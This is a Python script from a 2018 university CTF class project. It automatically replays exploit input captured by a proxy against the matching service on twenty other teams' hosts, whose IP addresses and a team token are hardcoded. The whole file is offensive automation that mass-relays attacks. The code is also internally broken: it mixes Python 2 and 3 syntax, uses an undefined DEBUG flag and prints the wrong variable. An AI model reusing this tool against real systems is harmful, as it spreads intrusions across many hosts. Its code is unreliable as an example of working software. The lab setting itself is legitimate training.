#!/usr/bin/python

#from swpag_client import Team
from api import *
import sys
import os
import time
import socks # pip install PySocks
import socket
from  _thread import *

# import PWN TOOLS LOGS and set logging.
os.environ["PWNLIB_SILENT"] = "1"
from pwn import *
from Q import *

'''------------------------------------------------------------------------------------------------------------------
 ' Automated tool that will reflect traffic sent to us to every other team for final - Project CTF
 '
 ' Group:	Black Shadow
 ' Team:	9
 ' Class: 	Spring 2018 CSE 545
 ' Professor:	Adam Doupe
 ' Date:	4/30/18
 '
 '
 ' Description: This tool runs as a standalone service. It will listen on a specific port for communication
 '		from the proxy. This tool then sends this input to every team in array REFLECTOR_HOSTS
 '
-----------------------------------------------------------------------------------------------------------------'''

# Configure port scanner. ##########################################################################################

# Run locally on home machine (requires connection through proxy) = 1
# Run from remote machine = 0
RUN_LOCAL = 1

# This is your team's token
TEAM_TOKEN = "04gwUvwtpPZzbzMMyaYGwMkTW3eBx34N"

# This may change between CTFs
GAME_IP = "http://18.219.145.160/"

# This is the list of teams to reflect traffic to.
REFLECT_HOSTS = ["team1", "team2", "team3", "team4", "team5", "team6", "team7", "team8", "team10", "team11",
			"team12", "team13", "team14", "team15", "team16", "team17", "team18", "team19", "team20", "team21"]

# Note the Host name and IP mapping might change during CTF
HOSTS_IP = {"team1":"172.31.129.1", "team2":"172.31.129.2", "team3":"172.31.129.3", "team4":"172.31.129.4", 
		  "team5":"172.31.129.5", "team6":"172.31.129.6", "team7":"172.31.129.7", "team8":"172.31.129.8",
		  "team9":"172.31.129.9", "team10":"172.31.129.10", "team11":"172.31.129.11", "team12":"172.31.129.12",
		  "team13":"172.31.129.13", "team14":"172.31.129.14", "team15":"172.31.129.15", "team16":"172.31.129.16",
		  "team17":"172.31.129.17", "team18":"172.31.129.18", "team19":"172.31.129.19", "team20":"172.31.129.20",
		  "team21":"172.31.129.21"}

# This is the time per tick in seconds.
TICK_TIME = 180

# Backdoor port. When backdoor is launched port is specified.
REFLECTOR_PORT = 49999

# keys for target
HOST = "hostname"
PORT = "port"
FLAG_ID = "flag_id"
TEAM_NAME = "team_name"

# Split incoming string by the following:
SPLIT_STR = ":__SpLiT__:"

####################################################################################################################

def debug(msg):
	if (DEBUG):
		print (msg)

# This will take in a Queue of user input and reflect to every team.
def reflector(userIn, port):
	userQ = Queue()
	userIn = userIn[1:-1].encode("ascii").split(",")
	userIn.reverse()

	for inputStr in userIn:
		userQ.enQ(inputStr.strip().lstrip()[1:-1].strip().lstrip())

	for team in REFLECT_HOSTS:
		if (RUN_LOCAL):
			team = HOSTS_IP[team]

		print ("Reflecting to team: " + team)
		tempQ = userQ.getDeepCopy()
		print ("THIS: " + str(tempQ.getItems()))
		try:
			# Connect to victim machine using PWNTools.
			conn = remote(team, port)
			text_recvd = conn.recv(timeout=0.3)
			print (text_recvd)
			while (not tempQ.isEmpty()):
				currInput = tempQ.deQ()
				print ("THIS: " + str(currInput))
				# Send input from queue.  
				conn.sendline(str(currInput))
				text_recvd = conn.recv(timeout=0.3);
				print (text_recvd)
			conn.close()
		except EOFError as error:
			print ("EOFError")
			continue

def clientThread(conn):
	data = ""
	try:
		conn.settimeout(2)
		tempRecv = conn.recv(1024)
		while tempRecv:
			data += tempRecv
			conn.settimeout(0.1)
			tempRecv = conn.recv(1024)
	except socket.timeout:
		if (data==""):
			print "timed out."
	except:
		print "Error:"
	
	if (data != ""):
		splitStr = data.decode().split(SPLIT_STR)
		if len(splitStr) == 2:
			userIn = splitStr[0]
			port = splitStr[1]

			print ("Received: " + str(userIn) + ", " + str(port))
			reflector(userIn, port)

	print ("closed")
	conn.close()

def main():
	try:

		if (RUN_LOCAL):
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1',4444)
			socket.socket = socks.socksocket

		s = socket.socket()
		print "Socket successfully created"

		s.bind(('', REFLECTOR_PORT))
		print "socket binded to %s" %(PORT)

	except socket.error:
		print ("Binding socket failed")
	
	s.listen(5)
	
	# Continuously listen for connections. Then spawn new thread.
	while True:
		c, addr = s.accept()
		# Do stuff.
		start_new_thread(clientThread, (c,))
	
	s.close()
main()
